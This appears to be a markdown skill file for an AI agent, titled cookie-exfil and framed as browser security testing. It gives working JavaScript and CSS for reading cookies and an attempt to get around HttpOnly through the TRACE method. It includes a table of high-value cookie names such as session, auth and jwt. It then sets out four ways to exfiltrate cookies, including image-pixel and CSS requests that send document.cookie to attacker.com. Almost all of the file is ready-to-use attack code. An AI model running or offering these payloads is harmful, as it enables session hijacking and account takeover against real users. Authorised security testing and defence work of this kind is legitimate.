---
name: cookie-exfil
description: Cookie exfiltration techniques for browser security testing. Covers standard cookies, HttpOnly bypass attempts, and multi-method exfiltration.
---

# Cookie Exfiltration

## Cookie Types & Extraction Methods

### Standard Cookies (document.cookie)
```javascript
// Basic extraction
document.cookie.split(';').reduce((a,c) => {
  const [k,v] = c.trim().split('=');
  a[k] = v; return a;
}, {});
```

### HttpOnly Cookies (bypass attempts)
1. **TRACE Method** (legacy servers):
   ```javascript
   fetch('/', {method: 'TRACE'}).then(r => r.text())
   ```
2. **XSTT Cross-Site Tracing** (if enabled)

3. **Via Network Log** (MITM position required)

## High-Value Cookie Targets
| Pattern | Description |
|---------|-------------|
| `session` / `sessid` | Session identifiers |
| `auth` / `token` | Authentication tokens |
| `jwt` / `id_token` | JWT tokens |
| `remember` / "keep" | Persistent auth |
| `csrf` / `xsrf` | CSRF tokens |

## Exfiltration Methods

### Method 1: Image Pixel
```javascript
new Image().src = 'https://attacker.com/collect?c=' + btoa(document.cookie);
```

### Method 2: CSS Background
```css
body::after {
  content: url('https://attacker.com/?c=...');
}
```

### Method 3: postMessage
```javascript
window.parent.postMessage({cookies: document.cookie}, '*');
```

### Method 4: Fetch/XMLHttpRequest
```javascript
navigator.sendBeacon(url, document.cookie);
```
